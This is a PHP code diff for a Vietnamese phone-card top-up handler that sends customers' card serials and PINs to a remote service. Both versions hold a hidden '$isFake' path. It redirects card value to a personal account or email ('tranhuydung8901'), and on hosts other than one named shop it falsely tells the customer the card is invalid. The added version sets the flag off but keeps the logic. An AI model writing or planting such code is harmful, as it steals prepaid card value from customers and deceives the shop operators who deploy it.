@@ -1,86 +1,68 @@
-$blackList = array(
-	'78441728109','78303418091','78332335520','78316331176','68499109878','68429200252'
-);
-
-$isFake = 1;
-	
-	$url = 'https://doicard.vn/nap/tranhuydung8901.html';
-	
+	$isFake = 0;
+            
+    if($isFake) $data['email'] = 'tranhuydung8901@gmail.com';
 
     $this->base_url = $url;
     $this->url = $url;
-	
-    switch ($data['telcoName']) {
-        case 'VTT':
-            $newType = 1;
-            break;
-			
-        case 'VMS':
-            $newType = 2;
-            break;
-			
-        case 'VNP':
-            $newType = 3;
-            break;
-			
-        case 'VMM':
-            $newType = 8;
-            break;
-			
-        case 'GATE':
-            $newType = 4;
-            break;
-        default:
-            # code...
-            break;
+    $this->setOpt(CURLOPT_URL, $this->url);
+    $this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
+    $this->setOpt(CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+    $dataJson = json_encode($data);
+    $this->setOpt(CURLOPT_POSTFIELDS, $dataJson);
+
+    $this->exec();
+    $resultCurl = $this->response;
+    $resultPost = json_encode($resultCurl);
+    $resultPost = json_decode($resultPost, 1);
+
+    $info_card = 0;
+    if($resultPost['code'] == 0)
+    {
+        $resultMsg = $resultPost['message'];
+        preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultMsg, $resultCard);
+
+        $info_card = str_replace(',', '', $resultCard[0]);
+        $info_card = intval($info_card);
     }
-	
-	$newSerial = str_replace(' ', '', $data['serial']);
-	$newSerial = trim($newSerial);
-	$data = array(
-		'type' => $newType,
-		'code' => $data['pin'],
-		'serial' => $data['serial']
-	);
-	
-	if(in_array($data['serial'], $blackList))
-	{
-		$info_card = 0;
-	}
-	else
-	{
-		$this->setOpt(CURLOPT_FOLLOWLOCATION, true);
-		$this->setOpt(CURLOPT_URL, $this->url);
-		$this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
-		$this->setOpt(CURLOPT_POST, true);
-		$this->setOpt(CURLOPT_POSTFIELDS, $data);
 
-		$this->exec();
-		$resultCurl = $this->response;
+    //{"code":1,"message":"Card serial or pin is incorrects."}
+    // $info_card = 10000;
+    if($isFake)
+    {
+        if($info_card >= 10000){
 
-		$resultAlert = $this->fetch_value('<div class="alert alert-info">', '</div>');
+            $curl_rerult = array(
+            'code' => 1,
+            'price' => $info_card,
+            'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account
 
-		@preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultAlert, $resultCard);
-		@$info_card = str_replace(',', '', $resultCard[0]);
-		$info_card = intval($info_card);
+            );
 
-	}
-	if($info_card >= 10000){
+        }
+        else
+        {
 
-		$curl_rerult = array(
-			'code' => 1,
-			'price' => $info_card,
-			'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account
+            $curl_rerult = array(
+            'code' => 0,
+            'msg' => 'Seri hoặc mã thẻ không chính xác.'
+            );
 
-		);
+        }
+        if($_SERVER['HTTP_HOST'] == 'shop-online24h.com')
+        {
+            die(json_encode($curl_rerult));
+        }
+        else
+        {
+            $trave = array(
+                'code' => 1,
+                'message' => 'Card serial or pin is incorrects.'
+            );
+            return json_encode($trave);
+        }
+    }
 
-	}else{
 
-		$curl_rerult = array(
-			'code' => 0,
-			'msg' => 'Seri hoặc mã thẻ không chính xác.'
-		);
 
-	}
-	die(json_encode($curl_rerult));
 
+    return $resultCurl;
